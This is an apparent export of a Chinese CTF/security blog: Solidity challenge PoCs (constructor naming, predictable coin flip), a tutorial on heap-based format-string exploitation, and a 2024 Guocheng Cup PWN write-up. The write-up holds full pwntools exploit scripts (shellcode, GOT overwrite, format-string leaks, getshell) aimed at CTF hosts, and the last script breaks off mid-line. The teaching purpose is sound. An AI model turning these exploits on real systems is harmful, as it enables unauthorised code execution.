class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ„é€ å‡½æ•°å‘½åé”™è¯¯</p>
<h3 id="Poc">Poc</h3>
<p>å‘é€ä¸€ç‚¹ETHå³å¯å˜æˆowner</p>
<h2 id="ç¬¬å››å…³-Coin-Flip">ç¬¬å››å…³ Coin Flip</h2>
<p>åˆçº¦ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶<code>coinFlip</code>æ˜¯é€šè¿‡<code>blockValue / FACTOR</code>è¿›è¡Œè®¡ç®—çš„</p>
<p>å³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">coinFlip = uint256(blockhash(block.number - 1)) / FACTOR</span><br></pre></td></tr></table></figure>
<p><code>block.number</code>å’Œ<code>FACTOR</code>å‡ä¸ºå·²çŸ¥å€¼</p>
<h3 id="PoC-2">PoC</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PoC&#123;</span><br><span class="line">    CoinFlip public target;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _guess() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>åŒºå—é“¾å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨Part1</title>
    <url>/2025/05/24/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2Part1/</url>
    <content><![CDATA[<h1>0x1 æ¦‚è¿°</h1>
<p>éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç‰¹æŒ‡åœ¨<code>printf(char *fmt, ...)</code>å‡½æ•°è°ƒç”¨ä¸­ï¼Œæ ¼å¼å­—ç¬¦ä¸²å‚æ•°<code>fmt</code>çš„å­˜å‚¨ä½ç½®ä¸åœ¨å½“å‰å‡½æ•°æ ˆå¸§ä¸­çš„æƒ…å†µã€‚å…¶å¸¸è§è¡¨ç°å½¢å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ä¸¤ç§ç±»å‹ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">å…¨å±€å˜é‡ä¼ å…¥ï¼šå½“æ ¼å¼å­—ç¬¦ä¸²é€šè¿‡å­˜å‚¨åœ¨å…¨å±€æ•°æ®åŒºï¼ˆ<code>.bss</code>æ®µï¼‰çš„å…¨å±€å˜é‡è¿›è¡Œä¼ é€’æ—¶</li>
<li class="lvl-2">å †æŒ‡é’ˆä¼ å…¥ï¼šå½“æ ¼å¼å­—ç¬¦ä¸²æŒ‡é’ˆæŒ‡å‘é€šè¿‡<code>malloc</code>ç­‰å‡½æ•°åŠ¨æ€åˆ†é…çš„å †å†…å­˜åŒºåŸŸæ—¶</li>
</ul>
<p>éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²å’Œæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æœ€å¤§çš„åŒºåˆ«å°±æ˜¯<strong>éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ— æ³•é€šè¿‡æ“æ§æˆ–è€…å¸ƒå±€æ ˆä¸Šçš„å˜é‡æ¥å®ç°ä»»æ„åœ°å€å†™ç­‰æ“ä½œ</strong>ã€‚å¯¹äºPart1ï¼Œæˆ‘ä»¬å…ˆæ¥ä»‹ç»ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ä¾‹å­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="comment">// gcc -fstack-protector-all -no-pie -z now -o main main.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inits</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter \&quot;quit\&quot; to stop program!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! backdoor found!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buf,<span class="string">&quot;quit&quot;</span>, <span class="number">4</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(buf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    inits();</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘åchecksec<br>
<img src="https://www.mmmick.cn/images/pasted-30.png" alt="upload successful"><br>
é™¤äº†PIEï¼Œå…¶ä½™ä¿æŠ¤å…¨å¼€å¦‚æœè¿™é¢˜æ˜¯åœ¨æ ˆä¸Šçš„è¯ï¼Œé‚£æ€è·¯å¾ˆæ˜ç¡®ï¼šæ³„éœ²æ ˆåœ°å€-&gt;å°†$bp+8å¡«åˆ°æ ˆä¸Š-&gt;ä¿®æ”¹è¿”å›åœ°å€ä¸ºbackdoorå³å¯ã€‚ä½†æ˜¯å¯¹äºæœ¬é¢˜å°±ä¸ä¸€æ ·äº†ï¼Œæˆ‘ä»¬æ‰€è¾“å…¥çš„å†…å®¹éƒ½è¢«æ”¾åˆ°äº†å †ä¸­ï¼Œæ— æ³•æ§åˆ¶æ ˆå¸ƒå±€æ¥ä»»æ„ä¿®æ”¹åœ°å€ã€‚è¿™æ—¶å€™å°±è¦å¼•å…¥exå¸ˆå‚…æ‰€æå‡ºçš„<a href="https://blog.eonew.cn/2019/08/27/printf-%E6%88%90%E9%93%BE%E6%94%BB%E5%87%BB/">printf æˆé“¾æ”»å‡»</a>ï¼Œæˆé“¾æ”»å‡»ä¸»è¦æ˜¯åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®é“¾æ¥è¿›è¡Œæ”»å‡»ã€‚</p>
<h1>0x2 åˆ©ç”¨</h1>
<p>æˆ‘ä»¬æ¥ä¸‹æ¥è¦åˆ©ç”¨çš„é“¾<strong>å½¢å¦‚</strong>ä¸‹å›¾<img src="https://www.mmmick.cn/images/pasted-31.png" alt="upload successful"><br>
ä¼—æ‰€å‘¨çŸ¥ï¼Œå¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹æŸä¸ªåœ°å€ä¸Šçš„å€¼ï¼Œæ‰€ä½¿ç”¨çš„å ä½ç¬¦ä¸º<code>%n</code>ï¼Œè€Œ<code>%n</code>æ‰€ä¿®æ”¹çš„å‚æ•°ä¸ºä¸€ä¸ªåœ°å€ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦ä¸€æ¡äºŒçº§ä»¥ä¸Šçš„æ•°æ®é“¾è¿›è¡Œæ”»å‡»çš„åŸå› äº†ã€‚å¯¹äºéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æ—¢ç„¶æ— æ³•æ§åˆ¶æ ˆå¸ƒå±€ï¼Œä¸ºä½•ä¸å°è¯•ä¸‹ç›´æ¥æ§åˆ¶æ ˆä¸Šå·²æœ‰å˜é‡ï¼Œå°†æ ˆå˜æˆæˆ‘ä»¬æƒ³è¦çš„æ ·å­å‘¢ï¼Ÿå¯¹äºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†ä¸‰çº§é“¾çš„<strong>ç¬¬äºŒçº§</strong>æ ˆåœ°å€å’Œå½“å‰å‡½æ•°è°ƒç”¨æ ˆçš„<strong>è¿”å›åœ°å€</strong>ç»™æ³„éœ²å‡ºæ¥<img src="https://www.mmmick.cn/images/pasted-32.png" alt="upload successful"><br>
è§‚å¯Ÿå‘ç°ï¼Œä¸‰çº§é“¾çš„æœ€åä¸€çº§çš„åœ°å€å’Œ<code>$bp+8</code>ä»…æœ‰ä½ä¸‰ä½ä¸åŒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠ<code>0x7fff1a1487a8 â€”â–¸ 0x7fff1a148898 â€”â–¸ 0x7fff1a148bc2 â—‚â€” 0x53006e69616d2f2e /* './main' */</code><br>
ä¿®æ”¹ä¸º<code>0x7fff1a1487a8 â€”â–¸ 0x7fff1a148898 â€”â–¸ 0x7fff1a148768 â€”â–¸ 0x4013e2 (main+47) â—‚â€” mov eax, 0</code><br>
<img src="https://www.mmmick.cn/images/pasted-33.png" alt="upload successful"><br>
è¿™æ ·å…¶å®å°±é—´æ¥å®ç°äº†ä¸Šé¢æ‰€è¿°çš„<strong>å°†$bp+8å¡«åˆ°æ ˆä¸Š</strong>è¿™ä¸€æ­¥éª¤åˆ°è¿™é‡Œçš„expä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chain_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = chain_addr - <span class="number">0x130</span></span><br><span class="line">log.success(<span class="string">f&quot;chain address: <span class="subst">&#123;<span class="built_in">hex</span>(chain_addr)&#125;</span>, ret address: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%19$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å…¶å®å°±ç®€å•äº†ï¼Œæ—¢ç„¶æ ˆä¸Šå·²ç»æœ‰ä¸€æ¡äºŒçº§é“¾æŒ‡å‘è¿”å›åœ°å€ï¼Œæˆ‘ä»¬åªéœ€è¦å†ç”¨ä¸€æ¬¡<code>%n</code>ä¿®æ”¹è¿”å›åœ°å€ä¸ºbackdoorå°±è¡Œäº†<img src="https://www.mmmick.cn/images/pasted-34.png" alt="å›¾ç‰‡æè¿°"><br>
åˆ°è¿™é‡Œçš„expä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor = <span class="number">0x4012b8</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(backdoor &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%49$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>æœ€åè¾“å…¥<code>quit</code>å³å¯getshell<br>
<img src="https://www.mmmick.cn/images/pasted-36.png" alt="å›¾ç‰‡æè¿°"></p>
<h1>0x3 EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter &quot;quit&quot; to stop program!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chain_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = chain_addr - <span class="number">0x130</span></span><br><span class="line">log.success(<span class="string">f&quot;chain address: <span class="subst">&#123;<span class="built_in">hex</span>(chain_addr)&#125;</span>, ret address: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%19$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012b8</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(backdoor &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%49$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>0x4 å‚è€ƒæ–‡ç« </h1>
<p>Exå¸ˆå‚…çš„printf æˆé“¾æ”»å‡»: <a href="https://blog.eonew.cn/2019/08/27/printf-%E6%88%90%E9%93%BE%E6%94%BB%E5%87%BB/">https://blog.eonew.cn/2019/08/27/printf-æˆé“¾æ”»å‡»/</a></p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      </tags>
  </entry>
  <entry>
    <title>å›½åŸæ¯2024 PWN WP</title>
    <url>/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-WP/</url>
    <content><![CDATA[<h1>å›½åŸæ¯2024 PWN WP</h1>
<h2 id="alphashell">alphashell</h2>
<p><img src="/images/pasted-14.png" alt="upload successful"></p>
<h3 id="åˆ†æ">åˆ†æ</h3>
<p>è¦æ±‚è¾“å…¥å­—ç¬¦ä¸ºå¯è§å­—ç¬¦</p>
<p>sandboxç¦ç”¨äº†open write writev readå’Œexecveç­‰å‡½æ•°</p>
<h3 id="EXP">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;125.70.243.22&#x27;,&#x27;31709&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov rbx,0x67616c662f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">xor r10,r10</span></span><br><span class="line"><span class="string">mov rdi,r10</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov eax,SYS_openat</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">mov r10,0x100</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov eax,SYS_sendfile</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">payload = obj.encode(sc,<span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="beverage-store">beverage store</h2>
<h3 id="åˆ†æ-2">åˆ†æ</h3>
<p>ç±»å‹è½¬æ¢é”™è¯¯ï¼Œå¯¼è‡´å¯ä»¥åå‘è¶Šç•Œä¿®æ”¹ä¹‹å‰çš„å†…å®¹</p>
<p>å¯¹äºè¿™é“é¢˜ï¼Œå¯ä»¥å…ˆä¿®æ”¹exit gotï¼Œé‡å¯ç¨‹åºæµç¨‹</p>
<p>æ¥ç€ä¿®æ”¹printf gotä¸ºsystemï¼Œæœ€åæŠŠexit goté‡æ–°æ”¹ä¸ºåé—¨å‡½æ•°åœ°å€å³å¯</p>
<h3 id="EXP-2">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31668&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">clibc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">clibc.srand(<span class="number">0x42424242</span>)</span><br><span class="line">num = clibc.rand()</span><br><span class="line">ru(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0x40133B</span>) + p64(<span class="number">0x401511</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;-6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sd(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">libc_base = addr64() - <span class="number">0x46061</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">payload = p64(system)</span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0x401511</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Offensive-Security">Offensive_Security</h2>
<h3 id="åˆ†æ-3">åˆ†æ</h3>
<p><img src="/images/pasted-15.png" alt="upload successful"></p>
<p><img src="/images/pasted-16.png" alt="upload successful"></p>
<p><img src="/images/pasted-17.png" alt="upload successful"></p>
<p>å¤šçº¿ç¨‹ä½†æ˜¯æœªå¯¹èµ„æºåŠ é”ï¼Œè¾“å…¥ä»»æ„åŒæ ·çš„å­—ç¬¦ä¸²å³å¯ç»•è¿‡é™åˆ¶</p>
<p><img src="/images/pasted-18.png" alt="upload successful"></p>
<p>å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯æ³„éœ²å¯†ç å’ŒlibcåŸºå€</p>
<p>æœ€åæ ˆæº¢å‡ºç„¶ågetshell</p>
<h3 id="EXP-3">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./attachment&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31652&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        sla(<span class="string">&#x27;Username:&#x27;</span>,<span class="string">&#x27;%7$s%39$p&#x27;</span>)</span><br><span class="line">        ru(<span class="string">&#x27;Welcome, \n&#x27;</span>)</span><br><span class="line">        passwd = p.recv(<span class="number">8</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        sl(passwd)</span><br><span class="line">        libc_leak = addr64()</span><br><span class="line">        lg(<span class="string">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class="line">        <span class="keyword">if</span> (libc_leak &amp; <span class="number">0xff</span>) == <span class="number">0x80</span>:</span><br><span class="line">            libc_base = libc_leak - <span class="number">0x21b780</span></span><br><span class="line">            lg(<span class="string">&#x27;libc base&#x27;</span>,libc_base)</span><br><span class="line">            sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            ogs = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span 